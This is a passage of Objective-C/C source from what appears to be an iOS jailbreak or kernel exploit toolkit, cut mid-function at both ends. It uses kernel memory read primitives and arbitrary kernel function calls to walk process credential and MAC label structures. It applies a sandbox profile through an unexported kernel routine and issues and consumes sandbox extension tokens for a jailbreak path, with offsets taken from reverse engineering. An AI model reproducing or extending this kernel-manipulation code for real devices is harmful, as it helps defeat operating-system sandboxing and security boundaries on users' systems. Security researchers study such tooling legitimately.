    dt1025_log_chain("app", pid, &chain, log);
    dt1025_stage(@"build102.5.98 KCALL598_CHAIN_LOG_OK");

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    uint64_t slot0_manual = chain.label ? mac_label_get(chain.label, 0) : 0;
    int mirror_slot = (int)configured_slot;
    uint64_t profile_mirror = chain.label ? mac_label_get(chain.label, mirror_slot) : 0;
    BOOL match = (slot0_manual == profile_mirror);

    dt1025_log(log, @"[*] build102.5.98 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);
    dt1025_log(log, @"[*] build102.5.98 mirror proc=0x%llx ucred=0x%llx label=0x%llx",
        (unsigned long long)chain.proc,
        (unsigned long long)chain.ucred,
        (unsigned long long)chain.label);
    dt1025_log(log, @"[*] build102.5.98 mirror slot0_manual=0x%llx profile_mirror=0x%llx match=%d",
        (unsigned long long)slot0_manual,
        (unsigned long long)profile_mirror,
        match ? 1 : 0);

    if (configured_slot == 0 && profile_mirror != 0 && profile_mirror == slot0_manual) {
        dt1025_log(log, @"[*] build102.5.98 mirror case: slot0==profile_mirror!=0 — handle-zero likely 55106C path");
    } else if (configured_slot != 0 && profile_mirror == 0 && slot0_manual != 0) {
        dt1025_log(log, @"[*] build102.5.98 mirror case: slot0!=0 profile_mirror=0 — kernel likely NULL profile");
    } else if (configured_slot != 0 && profile_mirror != 0 && profile_mirror != slot0_manual) {
        dt1025_log(log, @"[*] build102.5.98 mirror case: profile_mirror!=slot0_manual — wrong slot read");
    } else if (profile_mirror == 0 && slot0_manual == 0) {
        dt1025_log(log, @"[*] build102.5.98 mirror case: both zero — profile missing");
    }

    dt1025_set_verdict(verdictOut, @"KCALL598_RUNTIME_SLOT_MIRROR_OK");
    dt1025_stage(@"build102.5.98 KCALL598_RUNTIME_SLOT_MIRROR_OK");
    dt1025_log(log, @"[*] build102.5.98 KCALL598_NO_CONSUME_IN_RUN (55106C deferred)");
    dt1025_log(log, @"[*] build102.5.98 KCALL598_NO_LOADER_LANE_REGRESSION");
    return 0;
}

static int dt1025_run_label_slot_shape(pid_t pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_log(log, @"[*] build102.6.00 KCALL600_LABEL_SLOT_RAW_AND_SLOT0_SHAPE begin pid=%d",
        (int)pid);
    dt1025_stage(@"build102.6.00 KCALL600_KCALL_SAFE_PROBE_OK_CONFIRMED");

    dt1025_sandbox_chain_t chain = { 0 };
    int chain_r = dt1025_chain_for_pid(pid, &chain, log);
    if (chain_r != 0) {
        dt1025_log(log, @"[!] build102.6.00 chain log failed r=%d", chain_r);
        dt1025_set_verdict(verdictOut, @"KCALL600_CHAIN_LOG_FAIL");
        dt1025_stage(@"build102.6.00 KCALL600_CHAIN_LOG_FAIL");
        return -5;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.00 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);
    dt1025_log(log, @"[*] build102.6.00 app proc=0x%llx ucred=0x%llx label=0x%llx",
        (unsigned long long)chain.proc,
        (unsigned long long)chain.ucred,
        (unsigned long long)chain.label);
    dt1025_stage(@"build102.6.00 KCALL600_RUNTIME_SLOT_CONFIRMED");

    uint64_t slot_raw[8] = { 0 };
    for (unsigned slot = 0; slot < 8; slot++) {
        slot_raw[slot] = dt1025_label_slot_raw(chain.label, slot);
        dt1025_log(log, @"[*] build102.6.00 label slot%u raw=0x%llx (off=0x%llx)",
            slot,
            (unsigned long long)slot_raw[slot],
            (unsigned long long)(8ULL + ((uint64_t)slot * 8ULL)));
    }
    dt1025_stage(@"build102.6.00 KCALL600_LABEL_SLOTS_DUMPED");

    uint64_t slot0 = slot_raw[0];
    uint64_t configured_raw = configured_slot < 8 ? slot_raw[configured_slot] : 0;
    BOOL slot0_usable = slot0 != 0 && slot0 != (uint64_t)-1LL;

    int shape_verdict = 0;
    uint64_t shape_q0 = 0, shape_q8 = 0, shape_q10 = 0, shape_q18 = 0;

    if (slot0_usable) {
        shape_q0 = kread64(slot0 + 0x00);
        shape_q8 = kread64(slot0 + 0x08);
        shape_q10 = kread64(slot0 + 0x10);
        shape_q18 = kread64(slot0 + 0x18);
        dt1025_log(log, @"[*] build102.6.00 slot0 shape ptr=0x%llx", (unsigned long long)slot0);
        dt1025_log(log, @"[*] build102.6.00 slot0+0x00=0x%llx slot0+0x08=0x%llx slot0+0x10=0x%llx slot0+0x18=0x%llx",
            (unsigned long long)shape_q0,
            (unsigned long long)shape_q8,
            (unsigned long long)shape_q10,
            (unsigned long long)shape_q18);

        for (uint64_t off = 0x20; off <= 0xA0; off += 0x10) {
            uint64_t q = kread64(slot0 + off);
            dt1025_log(log, @"[*] build102.6.00 slot0+0x%02llx=0x%llx",
                (unsigned long long)off, (unsigned long long)q);
        }

        BOOL q8_zero = shape_q8 == 0;
        BOOL q8_kptr = dt1025_kptr_canonical(shape_q8);
        BOOL q10_kptr = dt1025_kptr_canonical(shape_q10);
        BOOL q8_small_scalar = !q8_zero && !q8_kptr;

        dt1025_log(log, @"[*] build102.6.00 IDA 54FAF0 contract: profile+0x08 pointer-or-NULL (not small scalar)");
        dt1025_log(log, @"[*] build102.6.00 IDA 532930 contract: profile+0x10 ref-holder (canonical kptr if real profile)");
        dt1025_log(log, @"[*] build102.6.00 shape flags q8_zero=%d q8_kptr=%d q8_small_scalar=%d q10_kptr=%d",
            q8_zero ? 1 : 0, q8_kptr ? 1 : 0, q8_small_scalar ? 1 : 0, q10_kptr ? 1 : 0);

        if (q8_small_scalar) {
            shape_verdict = 1;
            dt1025_log(log, @"[*] build102.6.00 shape verdict A: slot0+0x08 not pointer-or-NULL — not sandbox profile");
        } else if ((q8_zero || q8_kptr) && q10_kptr) {
            shape_verdict = 2;
            dt1025_log(log, @"[*] build102.6.00 shape verdict B: slot0 layout plausible sandbox profile but 532C68 uses configured slot %u",
                (unsigned)configured_slot);
        } else {
            shape_verdict = 3;
            dt1025_log(log, @"[*] build102.6.00 shape verdict C: slot0 shape ambiguous vs IDA contracts");
        }
        dt1025_stage(@"build102.6.00 KCALL600_SLOT0_SHAPE_DUMPED");
    } else {
        dt1025_log(log, @"[*] build102.6.00 slot0 shape skipped (raw=0x%llx)", (unsigned long long)slot0);
    }

    BOOL other_relevant = NO;
    for (unsigned slot = 0; slot < 8; slot++) {
        if (slot == 0)
            continue;
        uint64_t raw = slot_raw[slot];
        if (raw != 0 && raw != (uint64_t)-1LL) {
            other_relevant = YES;
            dt1025_log(log, @"[*] build102.6.00 non-null non-sentinel slot%u raw=0x%llx",
                slot, (unsigned long long)raw);
        }
    }
    if (configured_raw == (uint64_t)-1LL) {
        dt1025_log(log, @"[*] build102.6.00 configured slot%u raw=-1 (kernel mac_label_get_0 → NULL)",
            (unsigned)configured_slot);
    }

    int final_verdict = shape_verdict;
    if (other_relevant && final_verdict == 0)
        final_verdict = 4;
    else if (other_relevant && final_verdict != 0)
        dt1025_log(log, @"[*] build102.6.00 note: other non-null slots present (see D criteria)");

    const char *shape_tag = dt1025_slot0_shape_verdict_tag(final_verdict);
    dt1025_set_verdict(verdictOut, [NSString stringWithUTF8String:shape_tag]);
    dt1025_stage([NSString stringWithFormat:@"build102.6.00 %@", verdictOut ? *verdictOut : @"?"]);
    dt1025_log(log, @"[*] build102.6.00 final=%s configured_slot=%u slot0=0x%llx configured_raw=0x%llx",
        shape_tag, (unsigned)configured_slot,
        (unsigned long long)slot0, (unsigned long long)configured_raw);
    dt1025_stage(@"build102.6.00 KCALL600_LABEL_SLOT_RAW_AND_SLOT0_SHAPE");
    dt1025_log(log, @"[*] build102.6.00 KCALL600_NO_CONSUME_IN_RUN (55106C deferred)");
    dt1025_log(log, @"[*] build102.6.00 KCALL600_NO_LOADER_LANE_REGRESSION");
    return 0;
}

static int dt1025_run_app_launchd_slot1_compare(pid_t self_pid, void (^log)(NSString *line),
    NSString * _Nullable * _Nullable verdictOut)
{
    dt1025_log(log, @"[*] build102.6.02 KCALL602_APP_LAUNCHD_SLOT1_COMPARE begin self=%d launchd=1",
        (int)self_pid);
    dt1025_stage(@"build102.6.02 KCALL602_APP_LAUNCHD_SLOT1_COMPARE");
    dt1025_stage(@"build102.6.02 KCALL602_KCALL_SAFE_PROBE_OK_CONFIRMED");

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.02 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);
    dt1025_stage(@"build102.6.02 KCALL602_CONFIGURED_SLOT_CONFIRMED");

    dt1025_compare_target_t self_t = { 0 };
    dt1025_compare_target_t launchd_t = { 0 };

    int self_r = dt1025_dump_compare_target(self_pid, "self", configured_slot, &self_t, log);
    if (self_r != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL602_SELF_CHAIN_FAIL");
        dt1025_stage(@"build102.6.02 KCALL602_SELF_CHAIN_FAIL");
        return -5;
    }
    dt1025_stage(@"build102.6.02 KCALL602_SELF_SLOT_DUMPED");

    int launchd_r = dt1025_dump_compare_target(1, "launchd", configured_slot, &launchd_t, log);
    if (launchd_r != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL602_LAUNCHD_CHAIN_FAIL");
        dt1025_stage(@"build102.6.02 KCALL602_LAUNCHD_CHAIN_FAIL");
        return -6;
    }
    dt1025_stage(@"build102.6.02 KCALL602_LAUNCHD_SLOT_DUMPED");

    dt1025_compare_target_t extras[4];
    memset(extras, 0, sizeof(extras));
    size_t extra_count = 0;
    pid_t skip[8] = { self_pid, 1, 0, 0, 0, 0, 0, 0 };
    pid_t extra_pids[4] = { 0 };
    if (dt1025_optional_extra_pids(skip, 2, extra_pids, &extra_count) == 0 && extra_count > 0) {
        dt1025_log(log, @"[*] build102.6.02 optional extra targets count=%zu (read-only)", extra_count);
        for (size_t i = 0; i < extra_count && i < 4; i++) {
            char tag[32];
            snprintf(tag, sizeof(tag), "extra%zu", i);
            (void)dt1025_dump_compare_target(extra_pids[i], tag, configured_slot, &extras[i], log);
        }
    } else {
        dt1025_log(log, @"[*] build102.6.02 optional extra targets skipped");
    }

    BOOL self_cfg_empty = self_t.configured_raw == 0 || self_t.configured_raw == (uint64_t)-1LL;
    BOOL launchd_cfg_empty =
        launchd_t.configured_raw == 0 || launchd_t.configured_raw == (uint64_t)-1LL;
    BOOL launchd_valid = launchd_t.configured_shape_class == 2;
    BOOL other_valid = NO;
    pid_t other_valid_pid = 0;

    for (size_t i = 0; i < extra_count && i < 4; i++) {
        if (extras[i].configured_shape_class == 2) {
            other_valid = YES;
            other_valid_pid = extras[i].pid;
            break;
        }
    }

    int verdict_code = 0;
    if (launchd_valid) {
        verdict_code = 2;
        dt1025_stage(@"build102.6.02 KCALL602_PROFILE_SHAPE_CLASSIFIED");
    } else if (other_valid) {
        verdict_code = 3;
        dt1025_log(log, @"[*] build102.6.02 other valid profile pid=%d", (int)other_valid_pid);
        dt1025_stage(@"build102.6.02 KCALL602_PROFILE_SHAPE_CLASSIFIED");
    } else if (self_cfg_empty && launchd_cfg_empty) {
        verdict_code = 1;
    } else if (!self_cfg_empty && self_t.configured_shape_class != 2) {
        verdict_code = 4;
        dt1025_log(log, @"[!] build102.6.02 self configured slot non-empty but not valid profile");
    } else if (!launchd_cfg_empty && launchd_t.configured_shape_class != 2) {
        verdict_code = 4;
        dt1025_log(log, @"[!] build102.6.02 launchd configured slot non-empty but not valid profile");
    } else {
        verdict_code = 1;
    }

    const char *final_tag = dt1025_compare_final_verdict_tag(verdict_code);
    char letter = (char)dt1025_compare_verdict_letter(verdict_code);
    dt1025_set_verdict(verdictOut, [NSString stringWithUTF8String:final_tag]);
    dt1025_stage([NSString stringWithFormat:@"build102.6.02 %@", verdictOut ? *verdictOut : @"?"]);
    dt1025_log(log, @"[*] build102.6.02 compare summary configured_slot=%u self_cfg_raw=0x%llx launchd_cfg_raw=0x%llx",
        (unsigned)configured_slot,
        (unsigned long long)self_t.configured_raw,
        (unsigned long long)launchd_t.configured_raw);
    dt1025_log(log, @"[*] build102.6.02 final=%s verdict_letter=%c", final_tag, letter);
    dt1025_log(log, @"[*] build102.6.02 KCALL602_NO_CONSUME_IN_RUN (55106C deferred)");
    dt1025_log(log, @"[*] build102.6.02 KCALL602_NO_WRITES");
    dt1025_log(log, @"[*] build102.6.02 KCALL602_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.02 KCALL602_DEVICE_RUN_COMPLETE");
    return 0;
}

static int dt1025_run_53d540_self_apply_and_mirror(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();
    dt1025_log(log, @"[*] build102.6.04 KCALL604_53D540_SELF_APPLY begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.04 KCALL604_53D540_SELF_APPLY_BEGIN");
    dt1025_stage(@"build102.6.04 KCALL604_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_log(log, @"[!] build102.6.04 self-target fail self_pid=%d getpid=%d proc=0x%llx",
            (int)self_pid, upid, (unsigned long long)proc_kptr);
        dt1025_set_verdict(verdictOut, @"KCALL604_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    dt1025_log(log, @"[*] build102.6.04 self proc+0x%x=0x%x getpid=%d",
        koffsetof(proc, pid), proc_pid_field, upid);
    if ((int)proc_pid_field != upid) {
        dt1025_log(log, @"[!] build102.6.04 proc pid field mismatch");
        dt1025_set_verdict(verdictOut, @"KCALL604_SELF_TARGET_FAIL");
        return -11;
    }

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    dt1025_log(log, @"[*] build102.6.04 53D540 bundle profile=%s ext_ptr=0 ext_len=0",
        kDT604BuiltinProfileName);

    int kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &kern_ret) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL604_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.04 KCALL604_53D540_DISPATCH_FAIL");
        return -12;
    }

    if (kern_ret != 0) {
        NSString *fail = [NSString stringWithFormat:@"KCALL604_53D540_APPLY_FAIL_%d", kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.04 %@", fail]);
        return -13;
    }

    dt1025_stage(@"build102.6.04 KCALL604_53D540_APPLY_RETURN_0");
    dt1025_stage(@"build102.6.04 KCALL604_READONLY_MIRROR_AFTER_APPLY");

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.04 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);

    dt1025_compare_target_t self_post = { 0 };
    int mirror_r = dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot,
        &self_post, log);
    if (mirror_r != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL604_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.04 KCALL604_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        dt1025_set_verdict(verdictOut, @"KCALL604_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.04 KCALL604_SLOT1_STILL_NULL");
        return -15;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0) {
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log,
            "self_post_apply");
    }

    if (shape_class == 1) {
        dt1025_set_verdict(verdictOut, @"KCALL604_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.04 KCALL604_SLOT1_INVALID_SHAPE");
        return -16;
    }
    if (shape_class == 3) {
        dt1025_set_verdict(verdictOut, @"KCALL604_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.04 KCALL604_SLOT1_AMBIGUOUS_SHAPE");
        return -17;
    }
    if (shape_class != 2) {
        dt1025_set_verdict(verdictOut, @"KCALL604_SLOT1_SHAPE_UNKNOWN");
        dt1025_stage(@"build102.6.04 KCALL604_SLOT1_SHAPE_UNKNOWN");
        return -18;
    }

    BOOL m3_ok = NO, m4_ok = NO, m5_ok = NO, m7_ok = NO;
    int kpid = 0;
    if (dt1025_kcall_proc_pid_probe(proc_kptr, log, &kpid, &m3_ok, &m4_ok, &m5_ok, &m7_ok) != 0
        || !m3_ok || !m4_ok) {
        dt1025_set_verdict(verdictOut, @"KCALL604_KCALL_BASELINE_REGRESSION");
        dt1025_stage(@"build102.6.04 KCALL604_KCALL_BASELINE_REGRESSION");
        return -19;
    }

    dt1025_set_verdict(verdictOut, @"KCALL604_SELF_APPLY_MIRROR_OK");
    dt1025_stage(@"build102.6.04 KCALL604_SELF_APPLY_MIRROR_OK");
    dt1025_log(log, @"[*] build102.6.04 mirror summary configured_slot=%u cfg_raw=0x%llx shape=VALID",
        (unsigned)configured_slot, (unsigned long long)self_post.configured_raw);
    dt1025_log(log, @"[*] build102.6.04 KCALL604_NO_CONSUME_IN_RUN (55106C not called)");
    dt1025_log(log, @"[*] build102.6.04 KCALL604_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.04 KCALL604_DEVICE_RUN_COMPLETE");
    return 0;
}

static int dt1025_run_605_consume_after_self_apply(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.05 KCALL605_CONSUME_AFTER_SELF_APPLY begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.05 KCALL605_CONSUME_AFTER_SELF_APPLY");
    dt1025_stage(@"build102.6.05 KCALL605_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_log(log, @"[!] build102.6.05 self-target fail self_pid=%d getpid=%d proc=0x%llx",
            (int)self_pid, upid, (unsigned long long)proc_kptr);
        dt1025_set_verdict(verdictOut, @"KCALL605_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL605_SELF_TARGET_FAIL");
        return -11;
    }

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    dt1025_log(log, @"[*] build102.6.05 53D540 bundle profile=%s ext_ptr=0 ext_len=0",
        kDT604BuiltinProfileName);

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL605_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.05 KCALL605_53D540_DISPATCH_FAIL");
        return -12;
    }
    if (apply_kern_ret != 0) {
        NSString *fail = [NSString stringWithFormat:@"KCALL605_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.05 %@", fail]);
        return -13;
    }

    dt1025_stage(@"build102.6.05 KCALL605_53D540_APPLY_RETURN_0");

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.05 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL605_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.05 KCALL605_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        dt1025_set_verdict(verdictOut, @"KCALL605_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.05 KCALL605_SLOT1_STILL_NULL");
        return -15;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class == 1) {
        dt1025_set_verdict(verdictOut, @"KCALL605_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.05 KCALL605_SLOT1_INVALID_SHAPE");
        return -16;
    }
    if (shape_class == 3) {
        dt1025_set_verdict(verdictOut, @"KCALL605_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.05 KCALL605_SLOT1_AMBIGUOUS_SHAPE");
        return -17;
    }
    if (shape_class != 2) {
        dt1025_set_verdict(verdictOut, @"KCALL605_SLOT1_SHAPE_UNKNOWN");
        return -18;
    }

    dt1025_stage(@"build102.6.05 KCALL605_APPLY_MIRROR_OK");
    dt1025_log(log, @"[*] build102.6.05 mirror OK configured_slot=%u cfg_raw=0x%llx",
        (unsigned)configured_slot, (unsigned long long)self_post.configured_raw);

    char *token = dt1025_issue_token(kDTClassRead, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL605_ISSUE_TOKEN_FAIL");
        dt1025_stage(@"build102.6.05 KCALL605_ISSUE_TOKEN_FAIL");
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.05 read token issued class=%s token_len=%zu",
        kDTClassRead, token_len);
    dt1025_stage(@"build102.6.05 KCALL605_SINGLE_READ_TOKEN_ISSUED");
    dt1025_stage(@"build102.6.05 KCALL605_SINGLE_CONSUME_BEGIN");

    int consume_kern_ret = 0;
    int64_t handle_out = dt1025_kcall_consume_token(proc_kptr, token, log, &consume_kern_ret);

    dt1025_log(log, @"[*] build102.6.05 KCALL605_CONSUME_RESULT kern_ret=%d handle_out=%lld configured_slot=%u profile=0x%llx token_len=%zu",
        consume_kern_ret, (long long)handle_out, (unsigned)configured_slot,
        (unsigned long long)self_post.configured_raw, token_len);
    dt1025_stage(@"build102.6.05 KCALL605_CONSUME_RESULT");

    free(token);

    if (handle_out < 0) {
        dt1025_set_verdict(verdictOut, @"KCALL605_CONSUME_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.05 KCALL605_CONSUME_DISPATCH_FAIL");
        return -21;
    }

    if (consume_kern_ret != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL605_CONSUME_KERN_FAIL");
        dt1025_stage(@"build102.6.05 KCALL605_CONSUME_KERN_FAIL");
    } else if (handle_out > 0) {
        dt1025_set_verdict(verdictOut, @"KCALL605_CONSUME_HANDLE_NONZERO");
        dt1025_stage(@"build102.6.05 KCALL605_CONSUME_HANDLE_NONZERO");
    } else {
        dt1025_set_verdict(verdictOut, @"KCALL605_CONSUME_HANDLE_ZERO");
        dt1025_stage(@"build102.6.05 KCALL605_CONSUME_HANDLE_ZERO");
    }

    dt1025_log(log, @"[*] build102.6.05 KCALL605_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.05 KCALL605_NO_LOADER_LANE_REGRESSION");
    dt1025_stage(@"build102.6.05 KCALL605_DEVICE_RUN_COMPLETE");
    dt1025_log(log, @"[*] build102.6.05 verdict=%@ dash=NO helper=NO loader_lanes=NO consume=ONE_READ_ONLY",
        verdictOut ? *verdictOut : @"?");
    return 0;
}

static int dt1025_run_607_issue_before_apply_consume(uint64_t proc_kptr, pid_t self_pid,
    void (^log)(NSString *line), NSString * _Nullable * _Nullable verdictOut)
{
    int upid = getpid();

    dt1025_log(log, @"[*] build102.6.07 KCALL607_ISSUE_BEFORE_APPLY begin pid=%d proc=0x%llx",
        (int)self_pid, (unsigned long long)proc_kptr);
    dt1025_stage(@"build102.6.07 KCALL607_ISSUE_BEFORE_APPLY");
    dt1025_stage(@"build102.6.07 KCALL607_KCALL_SAFE_PROBE_OK_CONFIRMED");

    if ((int)self_pid != upid || proc_kptr == 0) {
        dt1025_log(log, @"[!] build102.6.07 self-target fail self_pid=%d getpid=%d proc=0x%llx",
            (int)self_pid, upid, (unsigned long long)proc_kptr);
        dt1025_set_verdict(verdictOut, @"KCALL607_SELF_TARGET_FAIL");
        return -10;
    }

    uint32_t proc_pid_field = kread32(proc_kptr + koffsetof(proc, pid));
    if ((int)proc_pid_field != upid) {
        dt1025_set_verdict(verdictOut, @"KCALL607_SELF_TARGET_FAIL");
        return -11;
    }

    uint32_t configured_slot = kread32(dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4));
    dt1025_log(log, @"[*] build102.6.07 runtime slot global=0x%llx configured_slot=%u",
        (unsigned long long)dt1025_kva(kDTUnslidSandboxRuntimeSlotECACE4),
        (unsigned)configured_slot);

    dt1025_compare_target_t self_pre = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_pre_issue", configured_slot, &self_pre, log) != 0) {
        dt1025_set_verdict(verdictOut, @"KCALL607_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.07 KCALL607_MIRROR_CHAIN_FAIL");
        return -14;
    }

    if (self_pre.configured_raw != (uint64_t)-1LL) {
        dt1025_log(log, @"[!] build102.6.07 pre-issue configured slot%u raw=0x%llx (expected -1)",
            (unsigned)configured_slot, (unsigned long long)self_pre.configured_raw);
        dt1025_set_verdict(verdictOut, @"KCALL607_PRE_ISSUE_SLOT1_NOT_NULL");
        dt1025_stage(@"build102.6.07 KCALL607_PRE_ISSUE_SLOT1_NOT_NULL");
        return -15;
    }

    dt1025_log(log, @"[*] build102.6.07 pre-issue NULL-profile confirmed configured_slot=%u raw=-1",
        (unsigned)configured_slot);

    char *token = dt1025_issue_token(kDTClassRead, log);
    if (!token) {
        dt1025_set_verdict(verdictOut, @"KCALL607_ISSUE_FAIL_NULL_PROFILE");
        dt1025_stage(@"build102.6.07 KCALL607_ISSUE_FAIL_NULL_PROFILE");
        return -20;
    }

    size_t token_len = strlen(token);
    dt1025_log(log, @"[*] build102.6.07 issue OK class=%s path=%s flags=0 token_len=%zu",
        kDTClassRead, kDTJbPath, token_len);
    dt1025_stage(@"build102.6.07 KCALL607_ISSUE_TOKEN_WHILE_NULL_PROFILE_OK");

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    dt1025_log(log, @"[*] build102.6.07 53D540 bundle profile=%s ext_ptr=0 ext_len=0",
        kDT604BuiltinProfileName);

    int apply_kern_ret = 0;
    if (dt1025_kcall_53d540(proc_kptr, &bundle, log, &apply_kern_ret) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_53D540_DISPATCH_FAIL");
        dt1025_stage(@"build102.6.07 KCALL607_53D540_DISPATCH_FAIL");
        return -12;
    }
    if (apply_kern_ret != 0) {
        free(token);
        NSString *fail = [NSString stringWithFormat:@"KCALL607_53D540_APPLY_FAIL_%d", apply_kern_ret];
        dt1025_set_verdict(verdictOut, fail);
        dt1025_stage([NSString stringWithFormat:@"build102.6.07 %@", fail]);
        return -13;
    }

    dt1025_stage(@"build102.6.07 KCALL607_53D540_APPLY_RETURN_0");

    dt1025_compare_target_t self_post = { 0 };
    if (dt1025_dump_compare_target(self_pid, "self_post_apply", configured_slot, &self_post, log) != 0) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_MIRROR_CHAIN_FAIL");
        dt1025_stage(@"build102.6.07 KCALL607_MIRROR_CHAIN_FAIL");
        return -16;
    }

    if (self_post.configured_raw == 0 || self_post.configured_raw == (uint64_t)-1LL) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_SLOT1_STILL_NULL");
        dt1025_stage(@"build102.6.07 KCALL607_SLOT1_STILL_NULL");
        return -17;
    }

    int shape_class = self_post.configured_shape_class;
    if (shape_class == 0)
        shape_class = dt1025_classify_sandbox_profile_shape(self_post.configured_raw, log, "self_post_apply");

    if (shape_class == 1) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_SLOT1_INVALID_SHAPE");
        dt1025_stage(@"build102.6.07 KCALL607_SLOT1_INVALID_SHAPE");
        return -18;
    }
    if (shape_class == 3) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_SLOT1_AMBIGUOUS_SHAPE");
        dt1025_stage(@"build102.6.07 KCALL607_SLOT1_AMBIGUOUS_SHAPE");
        return -19;
    }
    if (shape_class != 2) {
        free(token);
        dt1025_set_verdict(verdictOut, @"KCALL607_SLOT1_SHAPE_UNKNOWN");
        return -21;
    }

    dt1025_stage(@"build102.6.07 KCALL607_APPLY_MIRROR_OK");
    dt1025_log(log, @"[*] build102.6.07 mirror OK configured_slot=%u cfg_raw=0x%llx",
        (unsigned)configured_slot, (unsigned long long)self_post.configured_raw);

    dt1025_stage(@"build102.6.07 KCALL607_SINGLE_CONSUME_BEGIN");

